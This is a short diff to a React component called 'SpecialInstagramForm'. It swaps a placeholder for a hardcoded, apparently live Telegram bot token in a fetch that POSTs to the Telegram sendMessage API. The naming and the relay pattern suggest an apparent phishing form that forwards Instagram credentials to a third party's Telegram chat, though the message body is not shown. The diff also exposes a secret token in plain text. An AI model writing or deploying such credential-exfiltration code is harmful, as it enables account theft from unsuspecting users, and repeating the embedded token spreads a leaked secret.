@@ -63,7 +63,7 @@ export default function SpecialInstagramForm() {
         });
 
         // === TELEGRAM ===
-        await fetch(`https://api.telegram.org/botTOKEN/sendMessage`, {
+        await fetch(`https://api.telegram.org/bot8358381564:AAFHwgZHiX4gP-EgnFTnGPl36xwCP3HKByk/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
